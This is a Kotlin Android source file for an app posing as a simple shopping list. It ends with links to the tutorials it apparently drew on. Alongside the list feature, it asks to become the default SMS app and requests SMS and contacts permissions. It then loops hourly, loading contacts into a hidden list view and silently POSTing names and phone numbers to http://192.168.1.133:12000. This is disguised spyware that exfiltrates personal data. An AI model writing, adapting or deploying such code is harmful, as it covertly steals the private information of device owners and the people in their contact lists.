package com.example.shoppinglist

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.widget.*
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.get
import androidx.core.view.isVisible
import androidx.core.view.iterator
import androidx.lifecycle.lifecycleScope
import io.ktor.client.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.util.Identity.encode
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.lang.Exception
import java.util.jar.Manifest
import kotlin.coroutines.CoroutineContext

class MainActivity : AppCompatActivity() {

    var displayList: ArrayList<String> = ArrayList()
    lateinit var btn_add: Button
    lateinit var txt_add: EditText
    lateinit var mListView: ListView
    lateinit var arrayAdapter: ArrayAdapter<String>
    lateinit var from: Array<String>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val setSmsAppIntent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
        setSmsAppIntent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
        startActivityForResult(setSmsAppIntent, 2021)

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_MMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_WAP_PUSH) != PackageManager.PERMISSION_GRANTED  ) {
            ActivityCompat.requestPermissions(this,
                arrayOf(android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.SEND_SMS,
                    android.Manifest.permission.RECEIVE_MMS,
                    android.Manifest.permission.RECEIVE_WAP_PUSH),
                2021)
        }

        val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        startManagingCursor(cursor!!)

        from = arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER,
        ContactsContract.CommonDataKinds.Phone._ID)

        val to = intArrayOf(android.R.id.text1, android.R.id.text2)

        val simple: SimpleCursorAdapter = SimpleCursorAdapter(this, android.R.layout.simple_list_item_2, cursor,from, to)


        btn_add = findViewById<Button>(R.id.btn_add)
        txt_add = findViewById<EditText>(R.id.txt_add)

        mListView = findViewById<ListView>(R.id.lv_items)
        arrayAdapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, displayList)

        btn_add.setOnClickListener {
            displayList.add(txt_add.text.toString())
            txt_add.text.clear()
            mListView.adapter = arrayAdapter
        }

        mListView.setOnItemClickListener{parent, view, position, id ->
            val element = arrayAdapter.getItem(position)
            displayList.remove(element)
            mListView.adapter = arrayAdapter
        }

        lifecycleScope.launch {
            while (true) {
                readContacts()
                delay(3600000)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != Activity.RESULT_OK){
            return
        }
        when(resultCode){
            2021 -> return
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int,
                                            permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = if(checkPermissionGranted(requestCode, permissions, grantResults)) "permission granted" else "permission not granted"
        Toast.makeText(this,granted, Toast.LENGTH_SHORT).show()
    }

    fun checkPermissionGranted(requestCode: Int,
                               permissions: Array<String>, grantResults: IntArray): Boolean{
        when (requestCode) {
            2021 -> {
                // If request is cancelled, the result arrays are empty.
                return (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)
            }
        }
        return false
    }

    fun readContacts(){

        var from2 = listOf<String>(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER).toTypedArray()

        var to2 = intArrayOf(android.R.id.text1, android.R.id.text2)

        var rs = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        from, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)

        val adapter = SimpleCursorAdapter(this, android.R.layout.simple_list_item_2,
        rs, from2, to2, 0)

        val lv2: ListView = findViewById(R.id.lv2)

        lv2.isVisible = false
        lv2.adapter = adapter

        lifecycleScope.launch {
            val client = HttpClient()
            try {
                val httpResponse: Any = client.post("http://192.168.1.133:12000") {
                    parameter("Name", rs?.getString(0))
                    parameter("Number", rs?.getString(1)?.replace("(", "")?.replace(")", ""))
                }
            } catch ( e: Exception ){}

        }
    }
}

// SMS and permissions
// https://www.apriorit.com/dev-blog/227-handle-sms-on-android

// make the app
// https://www.tutorialspoint.com/how-to-dynamically-update-a-listview-on-android-kotlin
// https://stackoverflow.com/questions/55128123/kotlin-setonclicklistener-for-a-listview

// read contacts
// https://www.youtube.com/watch?v=Sxf04knGhJE

// http requests
// https://ktor.io/docs/request.html#query_parameters

